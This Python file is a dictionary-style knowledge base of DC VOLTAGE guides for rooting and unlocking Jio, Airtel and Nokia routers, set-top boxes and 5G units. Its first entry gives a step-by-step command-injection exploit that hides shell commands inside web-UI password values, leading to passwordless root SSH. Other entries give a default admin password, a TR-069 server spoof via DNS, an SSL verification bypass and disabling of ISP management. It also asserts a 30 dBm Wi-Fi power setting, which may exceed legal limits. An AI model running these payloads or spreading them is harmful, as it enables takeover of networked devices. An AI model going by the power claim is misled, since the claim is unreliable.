"""
Official Deep Knowledge Base for DC VOLTAGE Repositories.
Source of Truth: https://github.com/dc-voltage
STRICT POLICY: ONLY teach methods, guides, and tools authored by DC VOLTAGE.
"""

GITHUB_BASE = "https://github.com/dc-voltage"

REPOSITORIES_DATA = {
    # 1. Jio AirFiber 6J11 (JIDU 6111)
    "jidu_6111": {
        "title": "Jio AirFiber 6J11 Series (JIDU 6111 / 6411 / 6611 / 6811 / 6911)",
        "hardware": "Qualcomm IPQ50xx / IPQ95xx Wi-Fi 6 (AX6000), 256MB+ NAND, Dual-boot A/B",
        "repo_url": f"{GITHUB_BASE}/Standard-OpenWrt-LuCI-Web-GUI-Activate-IDU-6111",
        "ip": "192.168.31.1 (or 192.168.29.1)",
        "credentials": "admin / Jiocentrum",
        "method_overview": "WebUI unquoted command injection exploit to gain root SSH + Native LuCI enable + Dual-slot 1-click A/B flasher.",
        "step_by_step_exploit": [
            "Step 1: Connect PC to router LAN port via Ethernet cable.",
            "Step 2: Open browser and navigate to http://192.168.31.1. Login with `admin` / `Jiocentrum`.",
            "Step 3: Go to User Profile -> Change Password.",
            "Step 4: Set New Password to `Aa1$(passwd${IFS}-d${IFS}root)`. Save changes and log out (This wipes root password).",
            "Step 5: Log back in using `Aa1$(passwd${IFS}-d${IFS}root)`. Go to Change Password.",
            "Step 6: Set New Password to `Cc2$(killall${IFS}dropbear)`. Save and log out (Kills restricted SSH).",
            "Step 7: Log back in using `Cc2$(killall${IFS}dropbear)`. Go to Change Password.",
            "Step 8: Set New Password to `Dd3$(dropbear${IFS}-B)`. Save changes (Spawns passwordless root SSH).",
            "Step 9: Open Terminal / PowerShell and type `ssh root@192.168.31.1`. Press ENTER for blank password. You have root!"
        ],
        "native_luci_enable": [
            "To enable OpenWrt LuCI on stock Jio firmware without flashing:",
            "ssh root@192.168.31.1",
            "/etc/init.d/uhttpd enable && /etc/init.d/uhttpd start",
            "/etc/init.d/tr069 stop && /etc/init.d/tr069 disable",
            "Open http://192.168.31.1 to access native OpenWrt LuCI Web GUI!"
        ],
        "flasher_script": "Use scripts/DC_Voltage_Jio_6J11_Flasher.bat (Windows) or scripts/flash.sh (Linux) from GitHub for automated 1-click failsafe dual-slot flashing."
    },

    # 2. Airtel AirFiber AAP4221ZY (Zyxel EX4221-B0)
    "airtel_aap4221zy": {
        "title": "Airtel AirFiber AAP4221ZY (Zyxel EX4221-B0 Pure OpenWrt AX3000)",
        "hardware": "MediaTek MT7981B (Filogic 820) ARM64 Dual-Core Cortex-A53, MT7976C FEM, 256MB NAND",
        "repo_url": f"{GITHUB_BASE}/Airtel-AirFiber-AAP4221ZY-OpenWrt",
        "key_superpowers": [
            "1-Watt (30 dBm) High-Power Wi-Fi: Setting 5GHz radio to Channel 149 (UNII-3 / 5745 MHz) unlocks full 30.00 dBm (1000 mW) without DFS radar pauses.",
            "MediaTek PPE Hardware Flow Offloading: Line-rate 1Gbps NAT/routing at 0-1% CPU load.",
            "SafeXcel EIP97 Crypto Engine: Hardware-accelerated WireGuard VPN throughput.",
            "BSS Coloring (he_bss_color=1): 40% lower airtime contention in crowded apartment environments.",
            "TR-069 ISP Spyware Eradicated: No remote tracking or locks."
        ],
        "wifi_commands": """uci set wireless.radio0.channel='1'
uci set wireless.radio0.htmode='HE40'
uci set wireless.radio0.country='IN'
uci set wireless.radio1.channel='149'
uci set wireless.radio1.htmode='HE80'
uci set wireless.radio1.country='IN'
uci set wireless.default_radio1.he_bss_color='1'
uci commit wireless && wifi reload"""
    },

    # 3. JioFiber 4K STB (JMSD200A)
    "jmsd200a": {
        "title": "JioFiber 4K STB (JMSD200A) Hidden Features & TeleOS Unlocking",
        "hardware": "Amlogic ARMv8 Quad-Core Cortex-A55, Flextronics Ohm Board, 32GB eMMC (21GB free /data), Dolby MS12 V2 DSP",
        "repo_url": f"{GITHUB_BASE}/JMSD200A-hide-powerfull-fichers",
        "core_steps": [
            "1. Neutralize 20-Minute Auto-Shutdown Watchdog & TR-069 via ADB:",
            "adb shell pm disable-user --user 0 com.jio.tr069client",
            "adb shell pm disable-user --user 0 com.jio.teleos.watchdog",
            "2. Unhide Stock Google Android TV Settings:",
            "adb shell am start -n com.android.tv.settings/.MainSettings",
            "3. Optimize Speed (Disable animations):",
            "adb shell settings put global window_animation_scale 0.5",
            "adb shell settings put global transition_animation_scale 0.5",
            "adb shell settings put global animator_duration_scale 0.5",
            "4. Audiophile Dolby Atmos & DTS-HD Master Bitstream uncompressed transport.",
            "5. Full Debian 13 Headless Linux server setup on the STB."
        ]
    },

    # 4. Jio STB JMSC200A (SDMC 4KOTTSTB)
    "jmsc200a": {
        "title": "Jio STB (JMSC200A / 4KOTTSTB) ADB 100% Unlock",
        "hardware": "Amlogic ARMv8 Quad-Core, SDMC TeleOS 25.1.9 Android 11",
        "repo_url": f"{GITHUB_BASE}/JMSC200A-BOOM-SUCCESS-ADB-100-UNLOCK",
        "method": [
            "Re-enable USB Debugging non-invasively via local DNS emulation of TR-069 CWMP server (acs.oss.jio.com:9443).",
            "Injects Device.JioSTB.USB.USBDebugging=true and Device.JioSTB.FOTA.Disable=true.",
            "100% Preserves Widevine L1 4K DRM and Dolby Audio.",
            "Run automated debloater: `python3 scripts/auto_debloater.py <STB_IP>:5555` to install Leanback Launcher."
        ]
    },

    # 5. FreeView IPTV on Jio STB
    "freeview_iptv": {
        "title": "FreeView-IPTV: 500+ Zero-Subscription Live Channels on Jio STB",
        "repo_url": f"{GITHUB_BASE}/FreeView-IPTV-500-Zero-Subscription-Live-Channels-on-Jio-STB",
        "summary": "Transforms locked Jio STB into free satellite DTH receiver with 500+ channels.",
        "how_it_works": [
            "Bypasses JioTV+ ISP broadband lock.",
            "Works on ANY internet provider: Airtel, BSNL, Asianet, ACT, or mobile hotspot.",
            "Uses TiviMate IPTV Player + Public Legal M3U streams + Interactive EPG Guide.",
            "Zero lag hardware-accelerated 1080p Full HD video playback."
        ]
    },

    # 6. Jio ODU 52240 / 52140 5G Outdoor Unit
    "jio_odu": {
        "title": "Jio ODU 52240 / 52140 5G Outdoor Unit Unlock & TR-069 Eradication",
        "repo_url": f"{GITHUB_BASE}/ODU52240_unlocked-TR-069-disable-Voice-IMS-APN",
        "forensic_report": f"{GITHUB_BASE}/JODU52140-FORENSIC_RESEARCH_REPORT",
        "solutions": [
            "1. Router Mode: Use `ODU52240_unlocked_backup.bin` from repo. TR-069 blocked, eSIM manual download unlocked, Root Telnet on port 23 enabled.",
            "2. Pure Bridge Mode: Use `ODU52240_bridge_mode_backup.bin`. Converts ODU into pure direct 5G Bridge Mode without NAT.",
            "3. Voice IMS APN unhidden for custom routing."
        ]
    },

    # 7. Nokia FastMile 5G FWA (AOD311NK / 311nk)
    "nokia_311nk": {
        "title": "Nokia FastMile 5G FWA CPE (AOD311NK / 311NK)",
        "repo_url": f"{GITHUB_BASE}/Audit-Nokia-AOD311NK-5G-FWA-CPE",
        "throughput_repo": f"{GITHUB_BASE}/Nokia-AOD311NK-5G-FWA-1Gbps",
        "details": [
            "Hardware SPI flash: WSON8 package (Pin 1 /CS, Pin 2 DO/IO1, Pin 3 /WP 1.8V, Pin 4 GND, Pin 5 DI/IO0, Pin 6 CLK, Pin 7 /HOLD 1.8V, Pin 8 VCC 1.8V ONLY).",
            "1Gbps throughput tuning and 5G band locking for extreme carrier stability."
        ]
    },

    # 8. Airtel Zyxel 4101 Unlock
    "zyxel_4101": {
        "title": "Airtel Zyxel 4101 Unlock",
        "repo_url": f"{GITHUB_BASE}/airtel-zyxel-4101-unlock",
        "details": "Reverse-engineering, root shell access, and ISP decoupling for Airtel Zyxel 4101."
    },

    # 9. Quectel RG520F-JO 5G Module SSL Bypass
    "quectel_5g": {
        "title": "Engine SSL Bypass for Quectel RG520F-JO 5G Module AirFiber",
        "repo_url": f"{GITHUB_BASE}/Engine-SSL-Bypass-Quectel-RG520F-JO-5G-Module-AirFiber",
        "details": "Bypasses SSL/TLS verification on Quectel RG520F-JO 5G modules in AirFiber systems using AT commands."
    },

    # 10. RMDU-4301 8-Port Reverse PoE Switch
    "rmdu_switch": {
        "title": "RMDU-4301 8-Port Reverse PoE Managed Switch Unlock",
        "repo_url": f"{GITHUB_BASE}/RMDU-4301-8Port-Reverse-PoE-Managed-Switch-Unlock",
        "details": "Managed switch configurations, VLAN trunking, and root decoupling."
    },

    # 11. Mi TV Stick Dangal & Lag Fix
    "mitv_stick": {
        "title": "MiTV-Stick Dangal Hidden Features and Lag Fix",
        "repo_url": f"{GITHUB_BASE}/MiTV-Stick-dangal-hidden-features-and-lag-fix",
        "details": "Debloating and performance optimization guide for Xiaomi Mi TV Stick."
    },

    # 12. GenieACS Windows Complete Setup & TR-069 Server
    "genieacs_windows": {
        "title": "GenieACS Windows Native Setup & TR-069 / CWMP Server",
        "repo_url": f"{GITHUB_BASE}/genieacs-windows-setup",
        "ports": "CWMP: 7547, Web UI: 3000, NBI: 7557, FS: 7567",
        "details": [
            "Native Windows (10/11/Server) installation without WSL or Docker.",
            "Node.js 18/20 LTS + MongoDB Community Edition + GenieACS v1.2.9.",
            "NSSM background Windows services configuration with automated start/stop scripts.",
            "One-click Windows Firewall setup script for TR-069 port 7547.",
            "Complete ACS configuration guide for Jio, Airtel, Nokia, Zyxel, Huawei, Netlink ONTs and STBs."
        ],
        "default_creds": "http://localhost:3000 (admin / admin)"
    }
}

REPOSITORIES_DATA["jio_stb"] = REPOSITORIES_DATA["jmsc200a"]
REPOSITORIES_DATA["genieacs"] = REPOSITORIES_DATA["genieacs_windows"]
REPOSITORIES_DATA["cwmp"] = REPOSITORIES_DATA["genieacs_windows"]
REPOSITORIES_DATA["tr069"] = REPOSITORIES_DATA["genieacs_windows"]
GUIDES = REPOSITORIES_DATA
REPOSITORIES = REPOSITORIES_DATA
